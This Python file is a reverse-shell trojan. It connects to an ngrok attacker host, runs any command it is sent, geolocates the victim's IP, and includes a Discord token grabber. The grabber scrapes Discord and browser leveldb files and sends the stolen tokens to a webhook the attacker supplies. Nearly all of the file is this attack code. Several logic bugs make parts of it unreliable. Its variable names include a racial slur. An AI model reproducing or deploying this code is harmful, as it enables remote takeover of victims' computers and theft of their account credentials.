import socket
import subprocess
import os
from sys import exec_prefix
import requests
import json
import re
from urllib.request import Request, urlopen
class reverse_shell:
       def __init__(self):
              self.protocol = 'utf-8'
              self.sock = socket.socket(socket.AF_INET)
              self.attacker_ip  = '2.tcp.ngrok.io'
              self.size = 1024
              self.port = 11876
       def mainn(self):
              self.sock.connect((self.attacker_ip,self.port))
              while True:
                     
                     currentdir = os.getcwd()
                     sexx = f'\n{currentdir}:'
                     self.sock.send(bytes(sexx,self.protocol))
                     self.cmd  = self.sock.recv(self.size).decode(self.protocol)
                     self.cmd_lis = self.cmd.split()
                     if len(self.cmd_lis) > 0:
                            if self.cmd_lis[0] == 'cd':
                                   self.cd()
                            elif 'getip' in self.cmd_lis:
                                   self.iplocate()
                            elif 'getdiscordtoken' in self.cmd_lis:
                                   self.sock.send(bytes('enter the discord webhook u want  the info to go to[NEEDED]:',self.protocol))
                                   webhook = self.sock.recv(self.size).decode(self.protocol)
                                   self.sock.send(bytes('do u want to get pinged when u receive the msg throught the discord webhook[NEEDED]y/n:',self.protocol))
                                   res = self.sock.recv(self.size).decode(self.protocol)
                                   if res == 'y' or 'Y':
                                          ping = True
                                   else:
                                          ping = False

                                   
                                   try:
                                          self.main(ping,webhook)
                                          
                                   except Exception as o:
                                          self.sock.send(bytes('an error occured while running the script',self.protocol))
                                          print(o)
                            else:
                                   self.run_cmd()
       def cd(self):
              try:
                     os.chdir(self.cmd_lis[1])
              except:
                     self.sock.send(bytes('failed to change dirictry',self.protocol))


       def iplocate(self):
              self.sock.send(bytes('\nmay take a few secs\n','utf-8'))
              response = requests.get('https://api.ipify.org?format=json')
              pp = json.loads(response.content)
              ss = dict(pp)
              
              self.sock.send(bytes (str(ss),'utf-8'))
              self.sock.send(bytes('\ndo u want to ip look up this(not 100 percent accurate)y/n:','utf-8'))
              ask = self.sock.recv(1024).decode('utf-8')
              nigger = ask.split()
              if 'y' or 'Y' in nigger:
                     ip_lookup_results = requests.get('http://ip-api.com/json/',ss['ip'])
                     decryptt = json.loads(ip_lookup_results.content)
                     sex = dict(decryptt)
                     self.sock.send(bytes('----------------------------\n',self.protocol))
                     for key,result in sex.items():
                            ppp =f'{key} - {result}\n'
                            self.sock.send(bytes(ppp,'utf-8'))
                     self.sock.send(bytes('----------------------------',self.protocol))

       def run_cmd(self):
              output = subprocess.getoutput(self.cmd)
              self.sock.send(bytes(output,self.protocol))

       #i did not code this token grabber all credit goes to @wodxgod on github
       def find_tokens(path,self):
              for file_name in os.listdir(path):
                     path += '\\Local Storage\\leveldb'
                     tokens = []
                     if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue

                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                                for token in re.findall(regex, line):
                                    tokens.append(token)
              return tokens
       def main(self,PING_ME,WEBHOOK_URL):
              local = os.getenv('LOCALAPPDATA')
              roaming = os.getenv('APPDATA')

              paths = {
                     'Discord': roaming + '\\Discord',
                     'Discord Canary': roaming + '\\discordcanary',
                     'Discord PTB': roaming + '\\discordptb',
                     'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
                     'Opera': roaming + '\\Opera Software\\Opera Stable',
                     'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                     'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
                     }
              message = '@everyone' if PING_ME else ''
              for platform, path in paths.items():
                     if not os.path.exists(path):
                            continue

                     message += f'\n**{platform}**\n```\n'
                     tokens = self.find_tokens(path)

                     if len(tokens) > 0:
                            for token in tokens:
                                   message += f'{token}\n'
                     else:
                            message += 'No tokens found.\n'
                            message += '```'

                            headers = {
                                   'Content-Type': 'application/json',
                                   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                                   }

                            payload = json.dumps({'content': message})

                            try:
                                   req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
                                   urlopen(req)
                            except:
                                   pass              
       def trol(self):
              pass
       

o = reverse_shell()
o.mainn()
